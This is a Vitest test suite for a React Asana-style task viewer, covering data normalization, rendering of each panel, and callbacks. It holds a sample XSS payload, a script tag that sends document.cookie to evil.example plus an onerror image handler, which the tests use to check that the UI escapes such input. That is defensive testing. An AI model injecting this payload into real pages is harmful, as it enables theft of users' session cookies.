import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { readFileSync } from "node:fs";
import React from "react";
import {
  normalizeData, initialsOf, collapseStories, visibleStories, orderStories,
} from "./shape.js";
import { buildDemoTask, isDemoMode } from "./demo.js";
import TaskApp from "./TaskApp.jsx";
import Header from "./Header.jsx";
import FieldGrid from "./FieldGrid.jsx";
import Description from "./Description.jsx";
import Subtasks from "./Subtasks.jsx";
import AppsRow, { hostLabel } from "./AppsRow.jsx";
import Activity, { TokenText } from "./Activity.jsx";

const noop = () => {};

const HOSTILE = '<h1>Refund policy</h1>'
  + '<script>steal("https://evil.example/x?c=" + document.cookie)</script>'
  + '<img src="/logo.png" onerror="go(\'//evil.example/steal\')">';

const FX = buildDemoTask();
const VM = normalizeData(FX.task_data);
const CAPS_ON = VM.capabilities;
const CAPS_OFF = normalizeData(null).capabilities;

// Walk a React element tree WITHOUT rendering (the hook-free components can
// be invoked as plain functions), collecting elements matching `pred`.
function collectElements(node, pred, out = []) {
  if (node == null || typeof node !== "object") return out;
  if (Array.isArray(node)) {
    node.forEach((n) => collectElements(n, pred, out));
    return out;
  }
  if (pred(node)) out.push(node);
  if (node.props) collectElements(node.props.children, pred, out);
  return out;
}

function unescapeAttr(s) {
  return s.replace(/&quot;/g, '"').replace(/&#x27;/g, "'")
    .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
}

// ---------------------------------------------------------------- shape.js

describe("normalizeData totals", () => {
  it("null input yields a fully-defaulted viewmodel", () => {
    const vm = normalizeData(null);
    expect(vm.task_id).toBe("");
    expect(vm.header.title).toBe("");
    expect(vm.header.collaborators).toEqual([]);
    expect(vm.fields).toEqual([]);
    expect(vm.stories).toEqual([]);
    expect(vm.subtasks).toEqual([]);
    expect(vm.attachments).toEqual([]);
    expect(vm.description.srcdoc).toBe("");
    expect(vm.capabilities).toEqual(
      { complete: false, due: false, comment: false, subtask: false, refresh: false });
  });

  it("garbage-typed sections degrade to defaults, never throw", () => {
    const vm = normalizeData({
      header: 5, fields: "x", stories: {}, subtasks: 9,
      attachments: null, description: [], capabilities: "yes", task_id: 42,
    });
    expect(vm.task_id).toBe("42");
    expect(vm.header.completed).toBe(false);
    expect(vm.fields).toEqual([]);
    expect(vm.stories).toEqual([]);
    expect(vm.capabilities.complete).toBe(false);
  });

  it("unknown kinds fall back: field→text, story→system, token→text", () => {
    const vm = normalizeData({
      fields: [{ name: "F", kind: "weird" }],
      stories: [{ kind: "banana", tokens: [{ t: "blob", v: "x" }] }],
    });
    expect(vm.fields[0].kind).toBe("text");
    expect(vm.stories[0].kind).toBe("system");
    expect(vm.stories[0].tokens[0].t).toBe("text");
  });

  it("a story with plain text and no tokens gains a single text token", () => {
    const vm = normalizeData({ stories: [{ kind: "comment", text: "hello" }] });
    expect(vm.stories[0].tokens).toEqual([{ t: "text", v: "hello", href: "" }]);
  });

  it("people without names are dropped; initials are derived when absent", () => {
    const vm = normalizeData({
      header: { collaborators: [{ name: "" }, { name: "Jordan Avery" }] },
    });
    expect(vm.header.collaborators).toHaveLength(1);
    expect(vm.header.collaborators[0].initials).toBe("JA");
  });

  it("initialsOf covers single names and empties", () => {
    expect(initialsOf("Jordan Avery")).toBe("JA");
    expect(initialsOf("Cher")).toBe("C");
    expect(initialsOf("")).toBe("?");
    expect(initialsOf("  a  b  c ")).toBe("AC");
  });
});

describe("feed helpers", () => {
  const mk = (n) => Array.from({ length: n }, (_, i) => ({ kind: "comment", gid: `g${i}` }));

  it("seven or fewer items never collapse", () => {
    const { head, hidden, tail } = collapseStories(mk(7), false);
    expect(head).toHaveLength(7);
    expect(hidden).toBe(0);
    expect(tail).toEqual([]);
  });

  it("eight items collapse to head 1 / hidden 2 / tail 5", () => {
    const { head, hidden, tail } = collapseStories(mk(8), false);
    expect(head).toHaveLength(1);
    expect(hidden).toBe(2);
    expect(tail).toHaveLength(5);
  });

  it("expanded shows everything", () => {
    const { head, hidden } = collapseStories(mk(30), true);
    expect(head).toHaveLength(30);
    expect(hidden).toBe(0);
  });

  it("comments tab filters automation and system rows", () => {
    const mixed = [{ kind: "comment" }, { kind: "automation" }, { kind: "system" }];
    expect(visibleStories(mixed, "comments")).toHaveLength(1);
    expect(visibleStories(mixed, "all")).toHaveLength(3);
  });

  it("orderStories reverses without mutating the source", () => {
    const src = [{ gid: "a" }, { gid: "b" }];
    const rev = orderStories(src, false);
    expect(rev.map((s) => s.gid)).toEqual(["b", "a"]);
    expect(src.map((s) => s.gid)).toEqual(["a", "b"]);
  });
});

// ---------------------------------------------------------- demo fixture

describe("demo fixture contract", () => {
  const keysOf = (o) => Object.keys(o).sort();

  it("task_data carries exactly the contract keys", () => {
    expect(keysOf(FX.task_data)).toEqual([
      "attachments", "capabilities", "connected", "demo", "description",
      "fields", "header", "stories", "subtasks", "task_id",
    ]);
  });

  it("header carries exactly the contract keys", () => {
    expect(keysOf(FX.task_data.header)).toEqual([
      "assignee", "collaborators", "completed", "completed_on", "due_display",
      "due_iso", "freshness", "overdue", "permalink", "projects", "status_pill",
      "title",
    ]);
  });

  it("capabilities carries exactly the contract keys", () => {
    expect(keysOf(FX.task_data.capabilities)).toEqual(
      ["comment", "complete", "due", "refresh", "subtask"]);
  });

  it("is CX-Requests-shaped: 20 fields, 16 comments, automation + system rows", () => {
    expect(FX.task_data.fields).toHaveLength(20);
    const kinds = FX.task_data.stories.map((s) => s.kind);
    expect(kinds.filter((k) => k === "comment")).toHaveLength(16);
    expect(kinds.filter((k) => k === "automation").length).toBeGreaterThanOrEqual(2);
    expect(kinds.filter((k) => k === "system").length).toBeGreaterThanOrEqual(2);
  });

  it("survives normalizeData without loss of rows", () => {
    expect(VM.fields).toHaveLength(20);
    expect(VM.stories).toHaveLength(FX.task_data.stories.length);
    expect(VM.subtasks).toHaveLength(5);
    expect(VM.attachments).toHaveLength(4);
  });

  it("isDemoMode is false outside a browser", () => {
    expect(isDemoMode()).toBe(false);
  });
});

// -------------------------------------------------------------- TaskApp

describe("TaskApp without a bridge", () => {
  it("renders the waiting state", () => {
    const out = renderToStaticMarkup(<TaskApp />);
    expect(out).toContain("Waiting for the task bridge…");
    expect(out).toContain("route-task");
  });
});

describe("source guardrails", () => {
  const files = [
    "TaskApp.jsx", "Header.jsx", "FieldGrid.jsx", "Description.jsx",
    "Subtasks.jsx", "AppsRow.jsx", "Activity.jsx", "avatars.jsx",
    "shape.js", "demo.js",
  ];
  it.each(files)("%s has no raw-DOM sinks or network", (f) => {
    const src = readFileSync(new URL(`./${f}`, import.meta.url), "utf-8");
    expect(src).not.toContain("dangerouslySetInnerHTML");
    expect(src).not.toContain(".innerHTML");
    expect(src).not.toContain("fetch(");
    expect(src).not.toContain("localStorage");
  });
});

// --------------------------------------------------------------- Header

function renderHeader(over = {}, caps = CAPS_ON) {
  return renderToStaticMarkup(
    <Header header={{ ...VM.header, ...over }} capabilities={caps} busy={false}
            onToggleComplete={noop} onRefresh={noop} onOpenUrl={noop} onSetDue={noop} />);
}

describe("Header", () => {
  it("renders the title verbatim, template noise included", () => {
    const out = renderHeader();
    expect(out).toContain("BCBSMA copay update");
    expect(out).toContain("[[no value]]");
  });

  it("renders hostile titles as ESCAPED TEXT, never as markup", () => {
    const out = renderHeader({ title: HOSTILE });
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("evil.example");
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain('<img src="/logo.png"');
  });

  it("renders the due RANGE verbatim with the spaced en dash", () => {
    expect(renderHeader()).toContain("Sep 28, 2025 – Oct 17, 2025");
  });

  it("tints overdue dates", () => {
    expect(renderHeader({ overdue: true })).toContain("tk-due--overdue");
    expect(renderHeader({ overdue: false })).not.toContain("tk-due--overdue");
  });

  it("completed state shows the green banner and the ✓ Completed button", () => {
    const out = renderHeader({ completed: true });
    expect(out).toContain("✓ Completed");
    expect(out).toContain("tk-banner");
    expect(out).toContain("tk-complete-btn--done");
  });

  it("open state shows Mark complete and no banner", () => {
    const out = renderHeader({ completed: false });
    expect(out).toContain("✓ Mark complete");
    expect(out).not.toContain("tk-banner");
  });

  it("stacks assignee + collaborators with a +N overflow disc", () => {
    const out = renderHeader();
    // assignee + 4 collaborators, max 4 shown → +1
    expect(out).toContain("tk-avatar-more");
    expect(out).toContain("+1");
  });

  it("shows the Recently assigned affordance and the project · section row", () => {
    const out = renderHeader();
    expect(out).toContain("Recently assigned ▾");
    expect(out).toContain("CX Requests");
    expect(out).toContain("· Complete ▾");
  });

  it("shows freshness and the permalink", () => {
    const out = renderHeader();
    expect(out).toContain("Updated 5m ago");
    expect(out).toContain("Open in Asana ›");
  });

  it("renders a status pill when present", () => {
    const out = renderHeader({ status_pill: { text: "On track", color: "green" } });
    expect(out).toContain("On track");
    expect(out).toContain("tk-pill--green");
  });

  it("disables Mark complete without the capability", () => {
    const out = renderHeader({ completed: false }, CAPS_OFF);
    expect(out).toMatch(/<button[^>]*class="tk-complete-btn"[^>]*disabled/);
  });

  it("relays toggle with the flipped completed state", () => {
    const asked = [];
    const tree = Header({
      header: { ...VM.header, completed: false }, capabilities: CAPS_ON, busy: false,
      onToggleComplete: (d) => asked.push(d), onRefresh: noop, onOpenUrl: noop, onSetDue: noop,
    });
    const btns = collectElements(tree, (n) =>
      n.type === "button" && String(n.props.className || "").includes("tk-complete-btn"));
    btns[0].props.onClick();
    expect(asked).toEqual([true]);
  });

  it("assignee empty renders the em dash", () => {
    expect(renderHeader({ assignee: null })).toContain("—");
  });
});

// ------------------------------------------------------------- FieldGrid

function renderGrid(fields = VM.fields, hidden = false) {
  return renderToStaticMarkup(
    <FieldGrid fields={fields} hidden={hidden} onToggleHidden={noop} />);
}

describe("FieldGrid", () => {
  it("renders all 20 field names uncapped", () => {
    const out = renderGrid();
    for (const f of VM.fields) expect(out).toContain(f.name);
  });

  it("renders em dashes for empty values", () => {
    const out = renderGrid();
    expect(out).toContain("Draft URL");
    expect((out.match(/tk-empty/g) || []).length).toBeGreaterThanOrEqual(3);
  });

  it("renders enum pills with their palette classes", () => {
    const out = renderGrid();
    expect(out).toContain("tk-pill--green");
    expect(out).toContain("tk-pill--red");
    expect(out).toContain("Guru: Update");
  });

  it("renders people fields as avatar + name", () => {
    const out = renderGrid();
    expect(out).toContain("Priya Nair");
    expect(out).toContain("tk-field-person");
  });

  it("renders checkbox glyphs with the on-state class", () => {
    const out = renderGrid();
    expect(out).toContain("☑");
    expect(out).toContain("☐");
    expect(out).toContain("tk-checkbox--on");
  });

  it("hidden collapses rows and flips the toggle wording", () => {
    const shown = renderGrid(VM.fields, false);
    const hidden = renderGrid(VM.fields, true);
    expect(shown).toContain("Hide custom fields");
    expect(hidden).toContain("Show custom fields");
    expect(hidden).not.toContain("Guru: Update");
  });

  it("toggle click relays", () => {
    const asked = [];
    const tree = FieldGrid({
      fields: VM.fields, hidden: false, onToggleHidden: () => asked.push(1),
    });
    const btns = collectElements(tree, (n) =>
      n.type === "button" && String(n.props.className || "").includes("tk-fields-toggle"));
    btns[0].props.onClick();
    expect(asked).toEqual([1]);
  });

  it("renders hostile names and values as ESCAPED TEXT", () => {
    const vm = normalizeData({ fields: [
      { name: HOSTILE, kind: "text", value: '<svg onload=x>' },
    ] });
    const out = renderGrid(vm.fields);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain("<svg");
  });

  it("renders nothing for an empty field list", () => {
    expect(renderGrid([])).toBe("");
  });
});

// ----------------------------------------------------------- Description

describe("Description sandbox contract", () => {
  it("renders an iframe with an EMPTY sandbox (no scripts, no origin)", () => {
    const out = renderToStaticMarkup(<Description srcdoc="<p>hi</p>" />);
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("allow-scripts");
    expect(out).not.toContain("allow-same-origin");
  });

  it("carries the content via srcdoc", () => {
    const out = renderToStaticMarkup(<Description srcdoc="<h2>Steps</h2>" />);
    expect(out.toLowerCase()).toContain("srcdoc=");
    expect(unescapeAttr(out)).toContain("<h2>Steps</h2>");
  });

  it("keeps hostile bytes inside the escaped srcdoc attribute only", () => {
    const out = renderToStaticMarkup(<Description srcdoc={HOSTILE} />);
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain('<img src="/logo.png"');
  });

  it("renders nothing when the description is empty", () => {
    expect(renderToStaticMarkup(<Description srcdoc="" />)).toBe("");
  });

  it("renders the form-structured demo description", () => {
    const out = unescapeAttr(renderToStaticMarkup(<Description srcdoc={VM.description.srcdoc} />));
    expect(out).toContain("<strong>Describe your request.</strong>");
    expect(out).toContain("Care Navigators");
  });
});

// -------------------------------------------------------------- Subtasks

function renderSubs(subtasks = VM.subtasks, caps = CAPS_ON) {
  return renderToStaticMarkup(
    <Subtasks subtasks={subtasks} capabilities={caps} busy={false} onAdd={noop} />);
}

describe("Subtasks", () => {
  it("renders names with done styling and the promoted ↳ marker", () => {
    const out = renderSubs();
    expect(out).toContain("Update Guru card draft");
    expect(out).toContain("tk-subtask-name--done");
    expect(out).toContain("↳");
  });

  it("renders assignee and due meta", () => {
    const out = renderSubs();
    expect(out).toContain("Marcus Lee");
    expect(out).toContain("Aug 12");
  });

  it("shows the composer with the exact Asana placeholder", () => {
    expect(renderSubs()).toContain("Type to add a subtask…");
  });

  it("hides the composer without the capability", () => {
    expect(renderSubs(VM.subtasks, CAPS_OFF)).not.toContain("Type to add a subtask…");
  });

  it("renders nothing with no rows and no capability", () => {
    expect(renderSubs([], CAPS_OFF)).toBe("");
  });

  it("submit relays trimmed text and resets the form", () => {
    const asked = [];
    const resets = [];
    const tree = Subtasks({
      subtasks: [], capabilities: CAPS_ON, busy: false, onAdd: (t) => asked.push(t),
    });
    const forms = collectElements(tree, (n) => n.type === "form");
    forms[0].props.onSubmit({
      preventDefault: noop,
      currentTarget: {
        elements: { subtask: { value: "  New rollout step  " } },
        reset: () => resets.push(1),
      },
    });
    expect(asked).toEqual(["New rollout step"]);
    expect(resets).toEqual([1]);
  });

  it("renders hostile subtask names as ESCAPED TEXT", () => {
    const vm = normalizeData({ subtasks: [{ name: HOSTILE }] });
    const out = renderSubs(vm.subtasks);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
  });
});

// --------------------------------------------------------------- AppsRow

describe("AppsRow", () => {
  it("maps hosts to app labels", () => {
    expect(hostLabel("slack")).toBe("Slack");
    expect(hostLabel("gdrive")).toBe("Google Drive");
    expect(hostLabel("zendesk")).toBe("Zendesk");
    expect(hostLabel("asana")).toBe("");
    expect(hostLabel("mystery")).toBe("");
  });

  it("splits app rows from plain attachment chips", () => {
    const out = renderToStaticMarkup(
      <AppsRow attachments={VM.attachments} resolving="" onOpenAttachment={noop} />);
    expect(out).toContain("Slack");
    expect(out).toContain("Google Drive");
    expect(out).toContain("Zendesk");
    expect(out).toContain("tier-table-v2.png ›");
  });

  it("shows the resolving state on the clicked attachment", () => {
    const out = renderToStaticMarkup(
      <AppsRow attachments={VM.attachments} resolving="a2" onOpenAttachment={noop} />);
    expect(out).toContain("Copay comms plan — resolving…");
  });

  it("click relays the attachment gid", () => {
    const asked = [];
    const tree = AppsRow({
      attachments: VM.attachments, resolving: "", onOpenAttachment: (g) => asked.push(g),
    });
    const btns = collectElements(tree, (n) => n.type === "button");
    btns.forEach((b) => b.props.onClick());
    expect(asked).toEqual(["a1", "a2", "a3", "a4"]);
  });

  it("renders hostile attachment names as ESCAPED TEXT", () => {
    const vm = normalizeData({ attachments: [{ gid: "x", name: HOSTILE, host: "slack" }] });
    const out = renderToStaticMarkup(
      <AppsRow attachments={vm.attachments} resolving="" onOpenAttachment={noop} />);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
  });

  it("renders nothing for an empty list", () => {
    expect(renderToStaticMarkup(
      <AppsRow attachments={[]} resolving="" onOpenAttachment={noop} />)).toBe("");
  });
});

// -------------------------------------------------------------- Activity

function renderFeed(over = {}) {
  const props = {
    stories: VM.stories, tab: "all", oldestFirst: true, expanded: true,
    capabilities: CAPS_ON, busy: false,
    onTab: noop, onSort: noop, onExpand: noop, onPostComment: noop, onOpenUrl: noop,
    ...over,
  };
  return renderToStaticMarkup(<Activity {...props} />);
}

describe("Activity", () => {
  it("renders comment rows with author, timestamp and body", () => {
    const out = renderFeed();
    expect(out).toContain("Jordan Avery");
    expect(out).toContain("Jul 2, 9:14 AM");
    expect(out).toContain("Kicking this off");
  });

  it("falls back to someone for authorless comments", () => {
    const vm = normalizeData({ stories: [{ kind: "comment", text: "hi", when: "now" }] });
    expect(renderFeed({ stories: vm.stories })).toContain("someone");
  });

  it("renders mention chips and link tokens", () => {
    const out = renderFeed();
    expect(out).toContain("@Dana Whitfield");
    expect(out).toContain("tk-token-mention");
    expect(out).toContain("Copay update outline");
    expect(out).toContain("tk-token-link");
  });

  it("renders automation rows with the bolt glyph", () => {
    const out = renderFeed();
    expect(out).toContain("⚡");
    expect(out).toContain("When Task is overdue");
    expect(out).toContain("tk-story--automation");
  });

  it("renders system rows with the bold actor", () => {
    const out = renderFeed();
    expect(out).toContain("completed this task");
    expect(out).toContain("tk-story-actor");
  });

  it("the Comments tab filters automation and system rows out", () => {
    const out = renderFeed({ tab: "comments" });
    expect(out).not.toContain("⚡");
    expect(out).not.toContain("completed this task");
    expect(out).toContain("Kicking this off");
  });

  it("collapses the middle of a long comment feed to 10 more comments", () => {
    const out = renderFeed({ tab: "comments", expanded: false });
    expect(out).toContain("10 more comments");
    expect(out).toContain("Kicking this off");            // head survives
    expect(out).toContain("Reminder: mirror copies");     // tail survives
    expect(out).not.toContain("Billing review done");     // middle hidden
  });

  it("expanded shows the whole feed", () => {
    const out = renderFeed({ tab: "comments", expanded: true });
    expect(out).not.toContain("more comments");
    expect(out).toContain("Billing review done");
  });

  it("sort control reflects direction", () => {
    expect(renderFeed({ oldestFirst: true })).toContain("Oldest ↑↓");
    expect(renderFeed({ oldestFirst: false })).toContain("Newest ↑↓");
  });

  it("newest-first puts the latest story before the first", () => {
    const out = renderFeed({ oldestFirst: false, expanded: true });
    const first = out.indexOf("moved this task from New Requests");
    const kickoff = out.indexOf("Kicking this off");
    expect(first).toBeGreaterThan(-1);
    expect(first).toBeLessThan(kickoff);
  });

  it("renders the composer with the Asana placeholder and Comment button", () => {
    const out = renderFeed();
    expect(out).toContain("Ask a question or post an update…");
    expect(out).toContain(">Comment</button>");
  });

  it("hides the composer without the capability", () => {
    expect(renderFeed({ capabilities: CAPS_OFF })).not.toContain("Ask a question");
  });

  it("submit relays trimmed comment text and resets", () => {
    const asked = [];
    const resets = [];
    const tree = Activity({
      stories: [], tab: "all", oldestFirst: true, expanded: true,
      capabilities: CAPS_ON, busy: false,
      onTab: noop, onSort: noop, onExpand: noop, onOpenUrl: noop,
      onPostComment: (t) => asked.push(t),
    });
    const forms = collectElements(tree, (n) => n.type === "form");
    forms[0].props.onSubmit({
      preventDefault: noop,
      currentTarget: {
        elements: { comment: { value: " Shipping today. " } },
        reset: () => resets.push(1),
      },
    });
    expect(asked).toEqual(["Shipping today."]);
    expect(resets).toEqual([1]);
  });

  it("tab and expand controls relay", () => {
    const tabs = [];
    const expands = [];
    const tree = Activity({
      stories: VM.stories, tab: "comments", oldestFirst: true, expanded: false,
      capabilities: CAPS_OFF, busy: false,
      onTab: (t) => tabs.push(t), onSort: noop, onExpand: () => expands.push(1),
      onPostComment: noop, onOpenUrl: noop,
    });
    const btns = collectElements(tree, (n) => n.type === "button");
    btns.forEach((b) => b.props.onClick && b.props.onClick());
    expect(tabs).toEqual(["comments", "all"]);
    expect(expands).toEqual([1]);
  });

  it("renders hostile comment tokens as ESCAPED TEXT, never as markup", () => {
    const vm = normalizeData({ stories: [
      { kind: "comment", when: "now", tokens: [
        { t: "text", v: HOSTILE },
        { t: "link", v: HOSTILE, href: "https://ok.example/" },
        { t: "mention", v: "<b>evil</b>" },
      ] },
    ] });
    const out = renderFeed({ stories: vm.stories });
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("&lt;b&gt;evil&lt;/b&gt;");
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain("<b>evil</b>");
    expect(out).not.toContain("<iframe");
  });

  it("link tokens relay through onOpenUrl instead of navigating", () => {
    const asked = [];
    const tree = TokenText({
      tokens: [{ t: "link", v: "outline", href: "https://docs.example.com/x" }],
      onOpenUrl: (u) => asked.push(u),
    });
    const links = collectElements(tree, (n) => n.type === "a");
    links[0].props.onClick({ preventDefault: noop });
    expect(asked).toEqual(["https://docs.example.com/x"]);
  });
});
